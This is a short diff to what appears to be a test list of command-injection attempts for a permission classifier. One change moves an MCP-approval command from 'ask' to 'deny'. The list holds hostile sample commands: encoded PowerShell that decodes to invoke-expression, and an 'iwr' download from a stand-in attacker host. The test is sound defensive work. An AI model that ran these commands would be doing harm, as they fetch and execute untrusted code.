@@ -239,7 +239,7 @@ INJECTION_ATTEMPTS = [
     ("ask", "uvx some-tool"),
     ("ask", "uv run --with requests python app.py"),
     ("ask", "ln -s README.md notes.txt"),
-    ("ask", "winpty sentinel inventory set mcp-x --approve"),
+    ("deny", "winpty sentinel inventory set mcp-x --approve"),  # BG-17 since v0.7d
     ("deny", "pwsh /enc SQBFAFgA"),
     ("deny", "pwsh \u2013enc SQBFAFgA"),
     ("deny", "iwr https://attacker.invalid"),
